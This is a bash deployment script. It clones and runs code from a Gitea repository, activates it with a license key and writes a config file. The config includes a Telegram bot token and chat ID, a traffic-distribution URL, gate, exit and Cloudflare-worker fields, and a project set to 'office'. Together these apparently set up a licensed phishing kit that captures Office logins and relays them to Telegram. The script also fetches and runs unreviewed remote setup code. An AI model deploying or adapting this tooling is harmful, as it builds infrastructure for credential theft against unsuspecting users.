#!/bin/bash

# Start a new tmux session
tmux new-session -d -s mysession

echo "Updating system packages..."
sudo apt update && sudo apt upgrade -y
sudo apt update && sudo apt install expect -y

cd

echo "Cloning repository..."
git clone --depth 1 https://gitea.com/lux0nwushcf1/ironn

cd ironn || exit

echo "Running setup script..."
./setup.sh

# Wait for the setup process to complete
echo "Setup complete. Activating..."

# Extract the license from the .env file
LICENSE=$(grep "^LICENSE=" .env | cut -d '=' -f2)

# Automatically enter the license
expect <<EOF
spawn npm run activate
expect "Enter License key:"
send "$LICENSE\r"
expect eof
EOF

echo "Starting the application..."
npm run start

# Open the configuration file
CONFIG_FILE="nkp/config/user.json"
echo "Opening configuration file: $CONFIG_FILE"

# Extract values from .env file
TELEGRAM_BOT_TOKEN=$(grep "^TELEGRAM_BOT_TOKEN=" .env | cut -d '=' -f2 | tr -d '"')
TELEGRAM_USER_ID=$(grep "^CHATID=" .env | cut -d '=' -f2 | tr -d '"')
SRC_KEY=$(tr -dc 'a-z' </dev/urandom | head -c 8)

# Write the new configuration properly formatted
echo "Writing new configuration..."
cat <<EOL > $CONFIG_FILE
{
  "BOT_REDIRECT": "https://example.com",
  "TELEGRAM_BOT_TOKEN": "$TELEGRAM_BOT_TOKEN",
  "TELEGRAM_USER_ID": "$TELEGRAM_USER_ID",
  "CURRENT_PROJECT": "office",
  "SRC_KEY": "$SRC_KEY",
  "GATE_KEY": "",
  "TDS_URL": "http://127.0.0.1:5000",
  "EXIT_URL": "",
  "CF_WORKER_URL": "",
  "SALT_KEY": "",
  "ENABLE_PROXY": false,
  "GLOBAL_AGENT_HTTP_PROXY": ""
}
EOL

echo "Restarting application..."
npm run restart

echo "Process completed successfully."
